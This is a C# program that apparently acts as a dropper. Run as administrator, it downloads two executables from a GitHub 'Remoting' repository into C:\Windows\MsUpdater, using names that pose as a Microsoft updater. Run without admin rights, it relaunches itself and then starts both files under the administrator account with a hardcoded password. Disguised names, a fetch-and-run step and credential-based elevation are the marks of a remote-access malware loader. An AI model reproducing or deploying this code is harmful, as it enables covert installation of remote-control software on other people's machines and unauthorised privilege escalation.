namespace Bootstrap
{
    using System;
    using System.Diagnostics;
    using System.Net;
    using System.Security;
    using System.Security.Principal;

    internal class Program
    {
        private static void Main(string[] args)
        {
            if (args == null)
            {
                throw new ArgumentNullException(nameof(args));
            }

            const string Target1 = @"C:\Windows\MsUpdater\MsUpdater.exe";
            const string Target2 = @"C:\Windows\MsUpdater\MsUpdater2.exe";

            if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
            {
                using (var client = new WebClient())
                {
                    client.DownloadFile("https://github.com/Wiciaki/Remoting/blob/master/Internal/MsUpdater.exe?raw=true", Target1);
                    client.DownloadFile("https://github.com/Wiciaki/Remoting/blob/master/Internal/MsUpdater2.exe?raw=true", Target2);
                }

                return;
            }

            var password = new SecureString();

            foreach (var a in "abc123kappa")
            {
                password.AppendChar(a);
            }

            // ReSharper disable once PossibleNullReferenceException
            Process.Start(@"C:\Windows\MsUpdater\Bootstrap.exe", "administrator", password, string.Empty).WaitForExit();
            Process.Start(Target2);
            Process.Start(Target1, "administrator", password, string.Empty);
        }
    }
}